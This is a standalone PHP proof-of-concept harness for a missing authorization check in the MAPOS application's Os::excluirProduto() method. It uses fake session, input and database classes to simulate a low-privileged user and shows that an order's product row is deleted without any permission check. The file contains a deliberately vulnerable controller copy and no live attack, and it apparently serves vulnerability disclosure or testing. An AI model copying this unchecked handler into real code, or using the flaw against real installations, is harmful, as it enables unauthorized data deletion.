<?php
/*
 * Standalone PoC for MAPOS Os::excluirProduto() function-level authorization bypass.
 *
 * In application/controllers/Os.php, excluirProduto() reads idProduto/idOs from POST
 * and deletes from produtos_os without calling Permission::checkPermission().
 * MY_Controller only enforces that a user is logged in.
 *
 * This harness creates a low-privileged authenticated user whose permission
 * checker would deny OS deletion/editing, then executes the vulnerable method.
 */
error_reporting(E_ALL);
ini_set('display_errors', '1');

class FakePermission {
    public bool $checked = false;
    public function checkPermission($role, $activity) {
        $this->checked = true;
        return false;
    }
}
class FakeInput {
    private array $post;
    public function __construct(array $post) { $this->post = $post; }
    public function post($key) { return $this->post[$key] ?? null; }
}
class FakeSession {
    public array $flash = [];
    public function userdata($key) { return $key === 'logado' ? true : 'viewer-role'; }
    public function set_flashdata($k, $v) { $this->flash[$k] = $v; }
}
class FakeDb {
    public array $sets = [];
    public array $where = [];
    public int $updates = 0;
    public function set($k, $v) { $this->sets[$k] = $v; }
    public function where($k, $v) { $this->where[$k] = $v; }
    public function update($table) { $this->updates++; }
}
class FakeLoad { public function model($name) {} }
class FakeOsModel {
    public array $orders = [];
    public array $productsOs = [];
    public function getById($id) { return $this->orders[$id] ?? null; }
    public function delete($table, $field, $id) {
        if ($table === 'produtos_os' && $field === 'idProdutos_os' && isset($this->productsOs[$id])) {
            unset($this->productsOs[$id]);
            return true;
        }
        return false;
    }
}
class FakeProdutosModel { public array $stockUpdates = []; public function updateEstoque($produto, $quantidade, $op) { $this->stockUpdates[] = [$produto, $quantidade, $op]; } }

class VulnerableOsController {
    public FakeInput $input;
    public FakeSession $session;
    public FakePermission $permission;
    public FakeOsModel $os_model;
    public FakeDb $db;
    public FakeLoad $load;
    public FakeProdutosModel $produtos_model;
    public array $data = ['configuration' => ['control_estoque' => true]];

    public function excluirProduto() {
        $id = $this->input->post('idProduto');
        $idOs = $this->input->post('idOs');
        $os = $this->os_model->getById($idOs);
        if ($os == null) {
            throw new RuntimeException('OS not found');
        }
        // Missing: $this->permission->checkPermission(...)
        if ($this->os_model->delete('produtos_os', 'idProdutos_os', $id) == true) {
            $quantidade = $this->input->post('quantidade');
            $produto = $this->input->post('produto');
            $this->load->model('produtos_model');
            if ($this->data['configuration']['control_estoque']) {
                $this->produtos_model->updateEstoque($produto, $quantidade, '+');
            }
            $this->db->set('desconto', 0.00);
            $this->db->set('valor_desconto', 0.00);
            $this->db->set('tipo_desconto', null);
            $this->db->where('idOs', $idOs);
            $this->db->update('os');
            echo json_encode(['result' => true]);
        } else {
            echo json_encode(['result' => false]);
        }
    }
}

$ctl = new VulnerableOsController();
$ctl->permission = new FakePermission();
$ctl->session = new FakeSession();
$ctl->input = new FakeInput(['idProduto' => 501, 'idOs' => 1001, 'produto' => 42, 'quantidade' => 2]);
$ctl->os_model = new FakeOsModel();
$ctl->os_model->orders[1001] = (object)['idOs' => 1001, 'owner_user_id' => 999];
$ctl->os_model->productsOs[501] = ['idProdutos_os' => 501, 'os_id' => 1001, 'produtos_id' => 42];
$ctl->db = new FakeDb();
$ctl->load = new FakeLoad();
$ctl->produtos_model = new FakeProdutosModel();

echo "low-privileged authenticated user: yes\n";
echo "product row exists before request: " . (isset($ctl->os_model->productsOs[501]) ? 'yes' : 'no') . "\n";
ob_start();
$ctl->excluirProduto();
$response = ob_get_clean();
echo "controller response: $response\n";
echo "permission checker called: " . ($ctl->permission->checked ? 'yes' : 'no') . "\n";
echo "product row exists after request: " . (isset($ctl->os_model->productsOs[501]) ? 'yes' : 'no') . "\n";
if ($ctl->permission->checked) {
    fwrite(STDERR, "[FAIL] permission check was called unexpectedly\n"); exit(1);
}
if (isset($ctl->os_model->productsOs[501])) {
    fwrite(STDERR, "[FAIL] product row was not deleted\n"); exit(1);
}
echo "[VULNERABLE] Authenticated low-privilege user deleted an OS product row without function-level authorization.\n";
?>
